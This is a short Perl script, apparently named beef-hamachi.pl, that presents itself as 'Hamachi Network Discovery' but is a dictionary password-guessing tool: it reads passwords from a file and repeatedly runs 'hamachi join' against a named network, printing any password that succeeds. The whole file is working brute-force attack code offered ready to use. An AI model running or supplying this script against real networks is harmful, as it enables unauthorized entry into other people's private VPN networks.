#!/usr/bin/perl -w

print "\n==========\nHamachi Network Discovery\n==========\n";
print "Passwords come from pass.hmc file , modify it if you want\n\n";

$args = @ARGV;
$network = $ARGV[0];
$NAME = "pass.hmc";

if (!$network) {print "\nNo Network specified - USAGE:beef-hamachi.pl network-name\n\n";}
else {
open(NAME) or die("Passwords file pass.hmc is missing");

foreach $line(<NAME>) {
chomp ($line);

$out =  `hamachi join $network $line` ;
if (($out =~/ok/)){
print "Password for network [".$network."]:".$line."\n";}

}
print "\n\n";
}

